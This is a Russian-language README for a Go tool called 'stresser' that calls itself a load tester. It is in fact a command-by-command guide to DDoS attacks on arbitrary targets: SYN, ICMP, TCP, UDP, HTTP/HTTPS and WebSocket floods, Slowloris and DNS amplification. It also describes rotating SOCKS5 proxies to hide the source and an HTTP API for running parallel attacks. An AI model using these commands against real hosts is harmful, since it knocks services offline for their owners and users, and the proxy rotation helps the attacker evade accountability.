# 🚀 Универсальный инструмент для нагрузочного тестирования (L3/L4/L7)

## 📋 Инструкция по использованию

### 🔧 Требования
- Установленный Go (версии 1.16+)
- Linux/Windows/MacOS
- Dоступ к интернету

### 📥 Установка
```bash
git clone https://github.com/yourrepo/stress-tool.git
cd stress-tool
go build -o stresser
```

### 🛠 Настройка

1. Создайте файл с прокси (если нужно):

```bash
echo "1.1.1.1:8080" > proxies.txt
echo "2.2.2.2:3128" >> proxies.txt
```

### 🎯 Запуск атак

#### 🔥 L3 Атаки (Сетевой уровень)
```bash
# SYN Flood
./stresser target.com:80 SYN 5000 60

# ICMP Flood (требует root)
sudo ./stresser target.com ICMP 3000 120
```

### 🌊 L4 Атаки (Транспортный уровень)

```
# TCP Flood
./stresser target.com:443 TCP 10000 300

# UDP Flood
./stresser target.com:53 UDP 8000 180

# DNS Amplification
./stresser dns-server.com DNS 5000 60
```

### 💻 L7 Атаки (Прикладной уровень)

```
# HTTP Flood
./stresser http://target.com HTTP 20000 600

# HTTPS Flood
./stresser https://target.com HTTPS 15000 300

# Slowloris
./stresser target.com:80 SLOWLORIS 500 3600
```

### 📊 Параметры запуска

```text
./stresser <цель> <тип атаки> <количество потоков> <время в секундах> [размер пакета]

Пример:
./stresser example.com:80 TCP 10000 60 1024
```

### 🧰 Дополнительные функции
```
1. **Автоповтор** - автоматически переподключается при обрывах
2. **Ротация прокси** - если указан файл proxies.txt
3. **Статистика в реальном времени** - показывает RPS и успешные запросы
```

---

## 📝 Гайд по расширенным функциям

### WebSocket атака

```bash
./stresser ws://target.com:8080 WEBSOCKET 1000 60
```

### Кастомные HTTP-заголовки

Передавайте 6-м аргументом строку вида:
```
"Header1:Value1;Header2:Value2"
```
Пример:
```bash
./stresser https://target.com HTTP 5000 120 2048 "X-Api-Key:123;X-Test:1"
```

### Поддержка SOCKS5 прокси

В файле proxies.txt указывайте адреса SOCKS5-прокси. Для активации SOCKS5 прокси установите переменную окружения:
```bash
export PROXY_TYPE=socks5
```

### Автообновление списка прокси

Файл proxies.txt перечитывается автоматически каждые 30 секунд. Просто обновите файл — новые прокси будут подхвачены.

### Логирование ошибок

Все ошибки пишутся в файл `errors.log` в корне проекта.

### Множественные атаки (через API)

Можно запускать несколько атак параллельно через HTTP API.

### HTTP API для управления атаками

- Запуск атаки:
  ```bash
  curl "http://localhost:8081/start?target=example.com&type=HTTP&threads=100&duration=60"
  ```
- Остановить атаку:
  ```bash
  curl "http://localhost:8081/stop"
  ```
- Статус:
  ```bash
  curl "http://localhost:8081/status"
  ```

---

Остальные задачи отмечены как [-] и будут реализованы в будущих версиях.
